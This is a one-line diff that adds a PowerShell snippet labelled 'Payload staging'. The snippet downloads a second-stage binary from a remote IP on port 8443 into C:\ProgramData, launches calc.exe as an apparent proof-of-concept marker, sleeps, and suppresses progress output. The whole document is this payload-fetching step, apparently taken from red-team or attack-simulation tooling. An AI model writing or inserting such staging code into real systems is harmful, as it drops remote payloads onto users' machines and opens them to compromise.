@@ -1,0 +1,1 @@
+<# Payload staging #> $FetchUrl = "https://198.51.100.247:8443/cdn/stage2.bin"; $PayloadPath = 'C:\ProgramData\stage1.bin'; Invoke-WebRequest -Uri $FetchUrl -OutFile $PayloadPath -UseBasicParsing; Start-Process -FilePath "calc.exe"; Start-Sleep -Seconds 45; $ProgressPreference = "SilentlyContinue"
